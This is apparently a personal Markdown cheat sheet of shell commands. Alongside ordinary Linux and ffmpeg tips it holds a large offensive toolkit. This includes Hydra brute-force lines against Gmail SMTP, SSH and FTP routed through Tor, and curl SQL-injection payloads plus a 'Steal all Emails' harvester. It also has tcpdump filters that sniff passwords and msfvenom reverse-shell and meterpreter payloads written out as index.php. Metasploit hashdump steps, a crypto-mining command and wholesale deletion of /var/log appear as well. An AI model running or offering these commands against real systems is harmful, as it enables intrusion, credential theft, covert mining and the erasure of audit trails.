# LINUX CMD

```
#fix panel error (missing)
ALT+F2 and type: xfce4-panel --restart
or
ALT+F2 and type: xfce4-panel --preferences
#fix linux time and data ... from terminal:
sudo timedatectl set-timezone Asia/Riyadh
echo "Asia/Riyadh" | sudo tee /etc/timezone
sudo dpkg-reconfigure --frontend noninteractive tzdata
#install HyperV windows 10 open powershell as admin:
DISM /Online /Enable-Feature /All /FeatureName:Microsoft-Hyper-V
Dism /online /Enable-Feature /FeatureName:HypervisorPlatform
Dism /online /Enable-Feature /FeatureName:VirtualMachinePlatform
#stop HyperV :
bcdedit /set hypervisorlaunchtype off
or
DISM /Online /Disable-Feature:Microsoft-Hyper-V
#Next : Start > search : features <-- Virtual Machine Platform + Windows Hypervisor Platform than restart pc.
#install VPN HMA .. 
sudo apt-get install network-manager-openvpn-gnome
torsocks wget https://vpn.hidemyass.com/vpn-config/vpn-configs.zip
wget --quiet https://www.hidemyass.com/vpn-config/keys/ca.crt
wget --quiet https://www.hidemyass.com/vpn-config/keys/hmauser.crt
wget --quiet https://www.hidemyass.com/vpn-config/keys/hmauser.key
sudo cp ca.crt /usr/local/share/ca-certificates
sudo cp hma* /usr/local/share/ca-certificates
sudo update-ca-certificates
2: go to > wIfI > add VPN > select (import a file) select /vpn/TCP/ .. add username & password from HMA
# get tor ips to ipblock.conf : allow from ip...
wget -q https://www.dan.me.uk/torlist/ -O - | sed 's/^/allow from /g' > /var/www/html/ipblock.conf;
# remove space :
cat output.txt | sed -e 's/[\t ]//g;/^$/d'
# Clean /var/log or only gz file:
sudo find /var/log -type f -delete
sudo find /var/log -type f -delete -regex ".*\.gz$"
sudo find /var/log -type f -delete -regex ".*\.[0-9]$"
# read from output.txt line (3) to line (6) :
sed -n '3,6p' output.txt
# remove last string in output.txt :
sed 's/.\{1\}$//' output.txt
# remove string from output.txt ex:> {"result": < :
sed -i -e 's/XXXXXXX//g' output.txt
sed -i -e 's/{"result"://g' output.txt
#remove duplicated in output.txt 
sed '/^$/d' output.txt | awk '!a[$1]++' >> output_clear.txt
# tested remove `{"result":` and `}` in the end , :
sed -i -e 's/{"result"://g' output.txt && sed 's/.\{1\}$//' output.txt
# find and replace in the end } replace it with , :
sed -i -e 's/{"result"://g' out.txt && sed -i -e 's/.\{1\}$/,/g' out.txt
# find all *.log file and remove :
find . -name "*.log" | xargs rm
# find and grep apiKey string in all .sql files :
find . -iname "*.sql" | while read -r x; do cat $x | grep "apiKey"; done
# cat and grep between "" refresh_token:"xxxxxxxx",: xxxxx will be output
cat errors.txt | grep -oP 'refresh_token":"\K[^"]+'
- gnome-terminal -- bash -c "<command>; exec bash"
```
#find out all ips connected to your WiFi :
sudo apt-get install arp-scan
ifconfig
sudo arp-scan --interface=wlx503eaa7a4654 --localnet

#### ffmpeg conv mp4 to wav convert mp4 to iphone/ipad video from linux:

    ffmpeg -i e.mp4 -ac 2 -f wav e.wav
    ffmpeg -i 1.mp4 -codec copy output.mp4
    ffmpeg -i 1.mp4 -vcodec libx264 -pix_fmt yuv420p new.mp4
    ffmpeg -i xxxxxXxxx.flv -c:v libx264 -c:a aac -strict experimental -b:a 128k -crf 23 -profile:v baseline -movflags faststart output.mp4
    
    #Fix Mp4 from Linux to Iphone : 
    ffmpeg -i BAD_VID.mp4 -pix_fmt yuv420p -crf 18 good1.mp4
    ffmpeg -i BAD_VID.mp4 -pix_fmt yuv420p -c:v libx264 -crf 24 -pix_fmt yuv420p -tune film -c:a aac -b:a 192k -ar 44100 -vol 300 -strict -2 -speed fastest -crf 18 good2.mp4

#### gcc:

    gcc -m32 -fno-stack-protector -z execstack -o xshell xshell.c 
    gcc -m32 -fno-stack-protector -z execstack -o xshell xshell.asm

#### watch live netstat listen - ports:

    sudo watch "sudo netstat --tcp --udp --listening --program"
    
#### ANY APT / PIP / Scripts - CMD:

    APT: ---------------------
    wget http://ports.ubuntu.com/pool/universe/s/sslscan/sslscan_1.11.5-rbsec-1.1_arm64.deb
    sudo apt install gobuster
    sudo apt install websploit
    sudo apt install onesixtyone
    sudo apt install libxml2
    sudo apt install xsltproc #< xsltproc targetoutput.xml -o targetoutput.html
    sudo apt-get install libio-socket-socks-perl
    sudo apt-get install bleachbit
    sudo gem install bundler && bundle config set --local without 'test'
    sudo apt install build-essential checkinstall zlib1g-dev
    sudo apt install bacula-sd
    sudo apt-get install xclip -y
    sudo apt-get install python3 python-dev python3-dev build-essential libssl-dev libffi-dev libxml2-dev libxslt1-dev zlib1g-dev
    sudo apt  install youtube-dl
    cpanm Net::SSH::Perl
    sudo cpan -i Net::Whois::IP
    PIP: ------------------------
    pip3 install fierce
    pip3 install selenium --user
    pip3 install requests-html
    pip install Scrapy
    pip3 install python-dateutil==2.1 --user
    pip3 install telegram --user
    pip3 install python-telegram-bot
    pip3 install Emoji --user
    pip3 install typing --user
    pip3 install ujson
    pip3 install cachetools==4.2.2 --user
    pip3 install PyTelegramBotAPI==2.2.3
    pip3 install dotenv
    sudo pip3 install bandit
    Script: ---------------------
    #Hydra Brute Force Gmail : hydra smtp.gmail.com smtp -l xx@gmail.com -P /opt/backbox/warlist/pwd.lst -s 465 -S -v -V
    #Hydra Brute Force SSH : hydra -t 64 -l root -V -x '4:4:aA1"@#$!()=`~?><;:%^&*_-+/,.\ ' IP ssh
    #Hydra BF with TOR change -x  : hydra -t 4 -l root -V -x '6:6:a-z' TARGET_IP_HERE ssh HYDRA_PROXY=socks5://127.0.0.1:9150
    #Hydra BF : hydra -t 4 -l root -V -x '6:6:a-z' target.com ssh HYDRA_PROXY=socks5://127.0.0.1:9150 -I
    #Hydra BF FTP : hydra -t 64 -l root -V -x '4:4:aA1"@#$!()=`~?><;:%^&*_-+/,.\ ' TARGET_IP_HERE ftp -I HYDRA_PROXY=socks5://127.0.0.1:9150
    =====================================
    --socks5-hostname 127.0.0.1:9050
    #curl post : curl --socks5-hostname 127.0.0.1:9050 --data "search=1' or 1+1--+-"  target.com
    #curl injec : curl -v --header "X-CustomHeader: 'order by 111--+-" target.com
    #curl bypass resolve : curl --insecure --resolve target.com:80:127.0.0.1 "https://target.com"
    #curl Steal all Emails : curl -L -K -v --silent http://target.com/ 2>&1 | grep -hrio "\b[a-z0-9.-]\+@[a-z0-9.-]\+\.[a-z]\{2,4\}\+\b"
    #curl grep Server : curl -v --silent target.com 2>&1 | grep -E "Server:" | cut -d ':' -f2-2 | head -1 | tail -1
    #curl grep Wordpress : curl -insecure -X OPTIONS target.com | grep -E "admin-ajax.php|wp-content|wp-admin|wp-json|wp-includes"
    #curl grep input value form : curl -J -L target.com | grep -E "<input+" | grep -E "name=[\"]+[a-z]+"
    #wget grep page : wget --recursive --no-clobber --page-requisites --html-extension --convert-links --restrict-file-names=windows --domains website.org --no-parent target.com/login
    #wget mirror page 1 : wget --execute robots=off --recursive --no-parent --continue target.com
    #wget mirror page 2 : wget --page-requisites --span-hosts --convert-links --adjust-extension http://target.com
    #wget mirror with save folder : wget -r -P TargetFolder --execute robots=off --recursive --no-parent --continue target.com
    #wget : wget target.com/login --no-check-certificate --auth-no-challenge 2>&1
    =====================================
    #SSL : sslscan --http --bugs --verbose --show-certificate target.com
    #SSL : openssl s_client -showcerts -servername IP -connect target.com:443 2>/dev/null
    #SSL cert : openssl req -newkey rsa:2048 -nodes -keyout targetkey.key -x509 -days 1000 -subj '/CN=www.target.com/O=target./C=SA' -out targetcrt.crt
    =====================================
    #SQLMAP : sqlmap -u "target.com" --dbs -v 3 --tor --level 5 --risk 3 --time-sec 10 --batch --tamper=space2comment,between | grep -E -e "+\[INFO+]"
    #SQLMAP : sqlmap -u "target.com" --dbs -v 3 --tor --level 5 --risk 3 --time-sec 10 --batch --tamper=space2comment,between | egrep -i "(GET.+.appears.to.be|INFO.+.the.back-end.DBMS|back-end DBMS|web application technology|available databases|\[\*\]|it looks like the)"
    =====================================
    #nmap : nmap --script=http-methods.nse --script-args http-methods.url-path=/wp-config target.com
    #nmap : nmap --script=http-methods.nse --script-args http-methods.retest=1 target.com
    #nmap : nmap -d --script ssl-heartbleed --script-trace --script-args vulns.showall -sV target.com
    #nmap : nmap -p 21 --script=ftp-brute nmap target.com -d  
    #nmap : nmap -sA -T4 target.com
    #nmap : nmap -vv TARGET_IP_HERE  | awk -F'[ /]' '/Discovered open port/{print $NF":"$4}'
    #nmap : nmap -script http-methods -p443 -script-args http-methods.url-path='/' target.com | grep -Ee "GET|POST|HEAD|OPTIONS"
    #nmap : sudo nmap -T4 -sS target.com | grep -e "80\|81\|8080" | cut -d "/" -f1
    #nmap : nmap -D RND:10 -p 443 target.com
    #Tor: proxychains nmap -sTV -n -PN -p3306 -iL test_target.txt 
    #Fake DNS with NMAP : nmap target.com -D fakeDomain.com fakeDomain2.com
    nmap -sS -O target.com
    #view dir: nmap --script=http-enum -p80 -n target.com
    ==== Dirs info & DNC & IP ====
    #wget dir links : wget -c --user-agent="HHO" --content-disposition -E -qO- target.com | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u
    scanlink.py -H http://target.com/ -f linkadmin.txt
    dnsrecon.py -d target.com -D target.com.N.txt -t std --xml target.com.dns.xml
    brutesub.pl -d target.com -s target.com.txt -u 6 -n CCCC
    subbrute.py target.com -o target.com.names
    dirsearch -u target.com -e php
    sublist3r.py -d target.com -b -t 50 -p 80,443,21,22
    dotdotpwn.pl -m ftp -h www.target.com -M GET -U XX -P XX
    dotdotpwn.pl -m http -h target.com -d 6 -f -x HTTP=80
    golismero.py https://target.com
    nslookup -q=TXT target.com
    dmitry -winsepo target.com
    sudomy -d target.com -dP -eP -rS -cF -pS -tO -gW --httpx --dnsprobe -aI webanalyze -sS
    fierce --domain target.com --subdomains accounts admin ads
    --
    crunch 2 3 qwertyuioplkjhgfdsazxcvbnm1234567890 > smpList2
    onesixtyone -c smpList2 -d target.com
    --
    ---ip/host/dns---
    dig -t SOA target.com | grep -A1 "AUTHORITY SECTION\|ANSWER SECTION" | awk '{print$5}' | sed '/^$/d'
    dig +short target.com | awk '{ print ; exit }'
    host target.com | awk '/has address/ { print $4 }'
    host -4 -W1 -t A target.com 2>/dev/null | awk '/has address/ { print $NF; exit }'
    getent hosts target.com | awk '{ print $1 }'
    nslookup target.com | awk '/^Address: / { print $2 }'
    php -r "echo gethostbyname('target.com');"
    tor-resolve -5 -v www.target.com 127.0.0.1:9050
    Script_END: ---------------------
    
#### Garbage CMD :

    db_connect postgres:toor@127.0.0.1/msfbook   
    #share with linux - win to linux: sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000
    #TCPDUMP print only ip address clear:
    sudo tcpdump -nn -q ip -l | awk '{ ip = gensub(/([0-9]+.[0-9]+.[0-9]+.[0-9]+)(.*)/,"\\1","g",$3); if(!d[ip]) { print ip; d[ip]=1; fflush(stdout) } }'
    #TCPDUMP Spoof port 80 or 25 : 
    sudo tcpdump -vv -x -X -s 1500 -i any 'port 80' | egrep --color=auto -i 'password=|pass=|email=|login_pass|email=|pass_login=|'
    #TCPDUMP save to file : 
    sudo tcpdump -w loging.pcap -vv -x -X -s 1500 -i any 'port 80' | egrep -i 'password=|pass=|email=|login_pass|email=|pass_login=|' --line-buffered -B20
    #Check if ssh proccess on:
    ps aux | grep 'ssh' | awk '{print $6/1024;}' | awk '{avg += ($1 - avg) / NR;} END {print avg " MB";}'
    #LOG IP - SSH - Apache :
    tail -n 50 /var/log/auth.log | grep -E -o "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]{1,3}"
    tail -n 10 /var/log/apache2/access.log | grep -E -o "^[0-9]+.[0-9]+.[0-9]+.[0-9]{1,3}"
    #Random : 
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-5} | head -n 1
    cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-3} | head -n 5
    #install GO:
    sudo snap install go --classic
    #
    python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
    sudo fuser -vk 80/tcp
    echo terceS | mkpasswd -s -H MD5
    hash -d pip
    sudo docker run -it --rm wpscanteam/wpscan --url https://target.com/ --no-banner --random-user-agent
    #Fix error bus registering with the accessibility bus : 
    terminal > export NO_AT_BRIDGE=1
    
#### MSF / MSV CMD :
    
    db_connect --name local-https-data-service --token KEY_HERE --cert ~/.msf4/msf-ws-cert.pem --skip-verify https://localhost:5443
    db_nmap -Pn -sTV -T4 --open --min-parallelism 64 --version-all IP -p -
    spool /home/oglinux/.msf4/logs/logs.txt
    spool off
    cd /opt/metasploit-framework/embedded/framework/tools/exploit
    ruby pattern_offset.rb -q 21312421
    ruby pattern_offset.rb -l 336 -q 21312421
    ruby pattern_create.rb -l 336
    sudo msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=1313 EXITFUNC=thread -f c --platform windows -b "\x0a\x90" -e x86/shikata_ga_nai
    sudo msfvenom -x ssi32.exe -p windows/meterpreter/reverse_https -k -e x86/jmp_call_additive -i 3 -b '/x' LHOST=IP LPORT=4511 -f c -o msfx2.txt --platform Msf::Module::Platform::Windows --arch x86
    sudo msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00\x0a' -i 3 -f python LHOST=IP LPORT=1313
    sudo msfvenom -p php/meterpreter_reverse_tcp --arch php --platform Msf::Module::Platform::PHP LHOST=IP LPORT=4511 -f raw > shell.php
    sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=REALIP LPORT=4511 -f raw > index.php
    #CMD:---
    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > index.php && pbpaste >> index.php
    cat shell.php | bcopy && echo '<?php ' | tr -d '\n' > index.php && pbpaste >> index.php 
    i686-w64-mingw32-gcc ssi.c -o ssi32x2.exe
    sudo grep -r LD_PRELOAD /etc $HOME
    bash -o stratum+tcp://mine.cc.st:3333 -0 geox.1:x -B
    sysctl -w net.ipv4.ip_forward=1
    ----
    msf  exploit(usermap_script) > exploit
    Background session 1? [y/N]  y
    msf > creds
    msf  exploit(usermap_script) > use post/linux/gather/hashdump
    msf  post(hashdump) > sessions -l
    msf  post(hashdump) > run
    msf  post(hashdump) > loot
    
    
#### install nvidia - linux cmd : 
```bash
    #!/usr/bin/bash
    #sudo add-apt-repository ppa:graphics-drivers
    #sudo apt-get update
    sudo apt install nvidia-cuda-dev nvidia-cuda-toolkit 
    udd=$(ubuntu-drivers devices)
    echo "$udd\n"
    sudo lspci -v -s 01:00.0
    sleep 4.0 
    read -p "Type [ OK ] to restart, hit CTRL+ALT+DEL after 4 second\n close everything it will reset your computer\nwhen you ready hit " readnow
    sudo systemctl isolate multi-user.target
  
    # edit /etc/default/grub
    # modify GRUB_CMDLINE_LINUX_DEFAULT in order to add "amdgpu.vm_fragment_size=9" (without the quotes). The line may look something #like this after the change:
    #GRUB_CMDLINE_LINUX_DEFAULT="quiet splash amdgpu.vm_fragment_size=9"
````
